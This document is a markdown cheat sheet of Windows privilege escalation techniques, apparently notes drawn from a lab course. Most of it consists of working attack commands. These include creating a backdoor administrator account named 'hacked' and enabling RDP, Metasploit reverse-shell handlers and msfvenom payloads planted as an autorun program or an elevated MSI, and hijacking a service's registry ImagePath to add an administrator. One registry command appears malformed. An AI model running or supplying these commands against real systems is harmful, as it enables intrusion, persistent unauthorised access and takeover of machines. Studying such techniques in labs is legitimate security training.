# Windows Privlage Escalation
![alt text](https://miro.medium.com/max/2400/0*I-5KzneqUHfF7bHR.png)
## Kernel Exploits
- https://github.com/SecWiki/windows-kernel-exploits
## Admin Service that a Standard User can run
- https://www.youtube.com/watch?v=3BQKpPNlTSo
## Run Executable in Background
````
start /B program
````
## Disable/Enable Group Policy
- Disable:
````
REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f
````
## Enable:
````
REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /0 REG_DWORD /d 1 /f
Add Admin & Enable RDP
net user /add hacked Password1
net localgroup administrators hacked /add
net localgroup Administrateurs hacked /add (For French target)
net localgroup "Remote Desktop Users" hacked /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
````
## xfreerdp
````
xfreerdp /v:10.10.25.227 /u:Wade /p:parzival /cert:ignore /drive:/usr/share/windows-resources,share /dynamic-resolution
````
#### Credit
- Taken from Tib3rius

## Basic Enumeration
- Find out the users on the box and enumerate their privlages
````
net users
net users Administrator
````
## Registry Escalation - Autoruns
- Detection
- 1. Open command prompt and type: 
````
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
````
- 2. In Autoruns, click on the `Logon` tab.
- 3. From the listed results, notice that the “My Program” entry is pointing to 
````
C:\Program Files\Autorun Program\program.exe
````
- 4. In command prompt type: 
````
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
````
- 5. From the output, notice that the `"Everyone"` user group has `"FILE_ALL_ACCESS"` permission on the `"program.exe"` file.
- Exploitation
- Kali VM
- 1. Open command prompt and type: `msfconsole`
- 2. In Metasploit (msf > prompt) type: `use multi/handler`
- 3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp` or `windows/x64/shell/reverse_tcp`
- 4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
- 5. In Metasploit (msf > prompt) type: `run`
- 6. Open an additional command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`
- 7. Copy the generated file, `program.exe`, to the Windows VM.
- Windows VM
- 1. Place `program.exe` in `C:\Program Files\Autorun Program`
- 2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
- Kali VM
- 1. Wait for a new session to open in Metasploit.
- 2. In Metasploit (msf > prompt) type: `sessions -i [Session ID]`
- 3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: `getuid`
## Registry Escalation AlwaysInstallElevated
- Detection
- Windows VM
- 1.Open command prompt and type: 
````
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
````
- 2.From the output, notice that `AlwaysInstallElevated` value is `1`.
- 3.In command prompt type: 
````
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
````
- 4.From the output, notice that `AlwaysInstallElevated` value is `1`.
- Exploitation
- Kali VM

- 1. Open command prompt and type: msfconsole
- 2. In Metasploit (msf > prompt) type: `use multi/handler`
- 3. In Metasploit (msf > prompt) type: set payload `windows/meterpreter/reverse_tcp` or `windows/shell_reverse_tcp
- 4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
- 5. In Metasploit (msf > prompt) type: `run`
- 6. Open an additional command prompt and type: 
````
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
````
7. Copy the generated file, setup.msi, to the Windows VM.

Windows VM

1.Place `setup.msi` in `C:\Temp`.
2.Open command prompt and type: 
````
msiexec /quiet /qn /i C:\Temp\setup.msi
````
## Service Escalation The Registry
- Detection
- Windows VM
- 1. Open powershell prompt and type: 
````
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
````
- 2. Notice that the output suggests that user belong to `NT AUTHORITY\INTERACTIVE` has `FullContol` permission over the registry key.
- Exploitation
- Windows VM
- 1. Copy `C:\Users\User\Desktop\Tools\Source\windows_service.c` to the Kali VM.

Kali VM

1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
3. Copy the generated file x.exe, to the Windows VM.

Windows VM

1. Place x.exe in ‘C:\Temp’.
2. Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
3. In the command prompt type: sc start regsvc
4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

















